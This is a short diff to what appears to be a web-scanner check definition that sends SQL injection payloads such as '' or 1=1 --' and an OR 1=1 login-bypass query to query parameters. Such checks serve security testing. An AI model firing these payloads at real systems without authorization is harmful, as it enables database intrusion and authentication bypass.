@@ -7,8 +7,11 @@ metadata:
 run for each:
     payloadSet =
         "'",
-        "nu11secur1ty' or 1=1#",
-        "#nu11secur1ty' or 1=1#"
+        "' or 1=1 --",
+        "' or 1=1 --+",
+        "SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'",
+        "nu11secur1ty' or 1=1#"
+        
 
 given query insertion point then
     send payload called check:
